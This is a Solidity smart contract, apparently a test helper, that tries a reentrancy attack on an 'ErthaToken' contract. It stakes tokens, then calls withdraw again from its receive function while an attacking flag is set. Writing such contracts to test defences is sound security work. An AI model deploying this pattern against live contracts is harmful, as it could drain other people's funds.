// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ReentrancyAttacker
 * @dev Contract that attempts to exploit reentrancy vulnerabilities in the ErthaToken contract
 */
interface IErthaToken {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ReentrancyAttacker {
    IErthaToken public token;
    uint256 public attackAmount = 10 ether;
    bool public attacking = false;
    
    constructor(address _token) {
        token = IErthaToken(_token);
    }
    
    // Fallback to receive ETH
    receive() external payable {
        if (attacking) {
            token.withdraw(attackAmount);
        }
    }
    
    function attack() external {
        require(token.balanceOf(address(this)) >= attackAmount, "Insufficient token balance");
        
        // Stake tokens 
        token.stake(attackAmount);
        
        // Set attacking flag
        attacking = true;
        
        // Try to withdraw - should trigger reentrancy
        token.withdraw(attackAmount);
        
        // Reset flag
        attacking = false;
    }
    
    function getAddress() external view returns (address) {
        return address(this);
    }
}